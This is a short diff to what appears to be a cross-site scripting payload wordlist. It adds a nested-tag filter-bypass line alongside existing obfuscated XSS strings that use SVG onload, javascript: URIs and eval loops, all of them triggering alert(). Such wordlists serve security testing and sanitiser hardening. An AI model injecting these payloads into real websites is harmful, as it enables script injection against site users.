@@ -104,3 +104,4 @@ javascript:alert%281%29;
 alert;pg("XSS")
 <svg/onload=%26%23097lert%26lpar;1337)>
 <script>for((i)in(self))eval(i)(1)</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
